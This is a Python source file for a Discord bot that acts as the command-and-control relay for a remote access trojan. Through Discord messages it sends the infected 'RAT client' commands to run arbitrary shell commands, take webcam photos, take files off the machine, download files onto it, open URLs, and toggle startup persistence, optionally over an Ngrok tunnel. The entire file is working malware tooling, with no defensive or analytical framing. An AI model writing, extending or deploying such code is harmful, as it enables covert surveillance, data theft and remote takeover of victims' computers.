import os
import json
import asyncio
import aiohttp
from datetime import datetime
import discord
from discord.ext import commands
from dotenv import load_dotenv

# Load environment variables (Discord token, RAT endpoint, etc.)
load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
RAT_ENDPOINT = os.getenv("RAT_ENDPOINT", "http://localhost:8080/execute")
AUTH_TOKEN = os.getenv("RAT_AUTH_TOKEN", "changeme")
COMMAND_PREFIX = os.getenv("COMMAND_PREFIX", "!")
# Optional Ngrok support: discover public URL if enabled
USE_NGROK = os.getenv("USE_NGROK", "false").lower() == "true"
if USE_NGROK:
    try:
        import urllib.request, json as _json
        with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels") as resp:
            data = _json.load(resp)
            public_url = data.get("tunnels", [{}])[0].get("public_url")
            if public_url:
                RAT_ENDPOINT = f"{public_url}/execute"
                print(f"[Ngrok] Using public endpoint: {RAT_ENDPOINT}")
    except Exception as e:
        print(f"[Ngrok] Could not determine public endpoint: {e}")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} has connected to Discord!")

async def forward_command(command_str: str) -> dict:
    """Send the command to the RAT client via HTTP POST and return the JSON response."""
    headers = {"Authorization": f"Bearer {AUTH_TOKEN}", "Content-Type": "application/json"}
    payload = {"command": command_str}
    async with aiohttp.ClientSession() as session:
        async with session.post(RAT_ENDPOINT, headers=headers, json=payload) as resp:
            try:
                data = await resp.json()
            except Exception:
                text = await resp.text()
                data = {"error": f"Failed to parse JSON response: {text}"}
            return data

@bot.event
async def on_message(message):
    # Ignore messages from the bot itself
    if message.author == bot.user:
        return

    # Process only messages that start with the command prefix
    if not message.content.startswith(COMMAND_PREFIX):
        return

    # Kill command to shut down the RAT client (now !killclient)
    if message.content.strip() == f"{COMMAND_PREFIX}killclient":
        shutdown_resp = await forward_command("shutdown")
        await message.channel.send("Initiating shutdown of RAT client.")
        return

    # Kill command to shut down only the Discord bot (!killbot)
    if message.content.strip() == f"{COMMAND_PREFIX}killbot":
        await message.channel.send("Shutting down Discord bot.")
        await bot.close()
        return

    # Test connection command to verify communication with the RAT client
    if message.content.strip() == f"{COMMAND_PREFIX}testconnection":
        test_resp = await forward_command("echo testconnection")
        if "error" in test_resp:
            await message.channel.send(f"Connection test failed: {test_resp.get('error')}")
        else:
            await message.channel.send("Connection test succeeded.")
        return

    # Kill command to shut down both the RAT client and the Discord bot (!kill)
    if message.content.strip() == f"{COMMAND_PREFIX}kill":
        shutdown_resp = await forward_command("shutdown")
        await message.channel.send("Initiating shutdown of RAT client and Discord bot.")
        # Gracefully close the bot
        await bot.close()
        return
    # Persistence command to toggle startup persistence (!persistence on/off)
    if message.content.startswith(f"{COMMAND_PREFIX}persistence"):
        parts = message.content.split(maxsplit=1)
        if len(parts) != 2 or parts[1].lower() not in ("on", "off"):
            await message.channel.send(f"Usage: {COMMAND_PREFIX}persistence <on|off>")
            return
        state = parts[1].lower()
        resp = await forward_command(f"persistence {state}")
        if "error" in resp:
            await message.channel.send(f"Persistence command failed: {resp['error']}")
        else:
            await message.channel.send(f"Persistence set to {state}.")
        return

    # Help command to list available commands or detailed usage
    if message.content.startswith(f"{COMMAND_PREFIX}help"):
        # Remove prefix and split arguments
        parts = message.content.split(maxsplit=1)
        if len(parts) == 1:
            help_text = (
                "**Available commands:**\n"
                f"{COMMAND_PREFIX}killclient - Shut down the RAT client only.\n"
                f"{COMMAND_PREFIX}kill - Shut down both the RAT client and this Discord bot.\n"
                f"{COMMAND_PREFIX}killbot - Shut down the Discord bot only.\n"
                f"{COMMAND_PREFIX}persistence <on|off> - Toggle persistence on/off.\n"
                f"{COMMAND_PREFIX}testconnection - Test connection to the RAT client.\n"
                f"{COMMAND_PREFIX}shell <command> - Execute a shell command on the RAT client.\n"
                f"{COMMAND_PREFIX}snap - Capture a photo from the camera.\n"
                f"{COMMAND_PREFIX}url <url> - Open a URL in the default browser.\n"
                f"{COMMAND_PREFIX}upload <file_path> - Upload a file from the client.\n"
                f"{COMMAND_PREFIX}download <url> <dest_path> - Download a file to the client.\n"
                f"{COMMAND_PREFIX}help [command] - Show this help or detailed usage."
            )
            await message.channel.send(help_text)
        else:
            cmd = parts[1].strip().lower()
            details = {
                "killclient": f"Usage: {COMMAND_PREFIX}killclient\nExample: {COMMAND_PREFIX}killclient – shuts down the RAT client.",
                "kill": f"Usage: {COMMAND_PREFIX}kill\nExample: {COMMAND_PREFIX}kill – shuts down the RAT client and the Discord bot.",
                "killbot": f"Usage: {COMMAND_PREFIX}killbot\nExample: {COMMAND_PREFIX}killbot – shuts down the Discord bot only.",
                "persistence": f"Usage: {COMMAND_PREFIX}persistence <on|off>\nExample: {COMMAND_PREFIX}persistence on – enables persistence.",
                "testconnection": f"Usage: {COMMAND_PREFIX}testconnection\nExample: {COMMAND_PREFIX}testconnection – tests connection to the RAT client.",
                "shell": f"Usage: {COMMAND_PREFIX}shell <command>\nExample: {COMMAND_PREFIX}shell whoami – runs `whoami` on the RAT client.",
                "help": f"Usage: {COMMAND_PREFIX}help [command]\nExample: {COMMAND_PREFIX}help killclient – shows detailed help for `killclient`."
            }
            await message.channel.send(details.get(cmd, "Command not recognized. Use !help to see available commands."))
        return

    # Determine which command to forward based on the prefix
    cmd = message.content.strip()
    if cmd.startswith(f"{COMMAND_PREFIX}snap"):
        command_body = "snap"
    elif cmd.startswith(f"{COMMAND_PREFIX}url "):
        arg = cmd[len(f"{COMMAND_PREFIX}url "):].strip()
        command_body = f"url {arg}"
    elif cmd.startswith(f"{COMMAND_PREFIX}upload "):
        arg = cmd[len(f"{COMMAND_PREFIX}upload "):].strip()
        command_body = f"upload {arg}"
    elif cmd.startswith(f"{COMMAND_PREFIX}download "):
        arg = cmd[len(f"{COMMAND_PREFIX}download "):].strip()
        command_body = f"download {arg}"
    elif cmd.startswith(f"{COMMAND_PREFIX}shell "):
        command_body = cmd[len(f"{COMMAND_PREFIX}shell "):].strip()
    else:
        await message.channel.send("Invalid command format. Use !snap, !url <url>, !upload <path>, !download <url> <dest>, or !shell <command>.")
        return

    if not command_body:
        await message.channel.send("No command provided.")
        return

    # Forward the command to the RAT client
    response = await forward_command(command_body)

    # Prepare a response message
    if "error" in response:
        reply = f"Error: {response['error']}"
    else:
        success = response.get("success", False)
        output = response.get("output", "")
        reply = f"**Command:** `{command_body}`\n**Success:** {success}\n`{output}`"

    # Discord has a character limit per message; truncate if necessary
    if len(reply) > 1900:
        reply = reply[:1900] + "... (truncated)"

    await message.channel.send(reply)

# Run the bot
if __name__ == "__main__":
    if not DISCORD_TOKEN:
        raise EnvironmentError("DISCORD_BOT_TOKEN not set in .env")
    bot.run(DISCORD_TOKEN)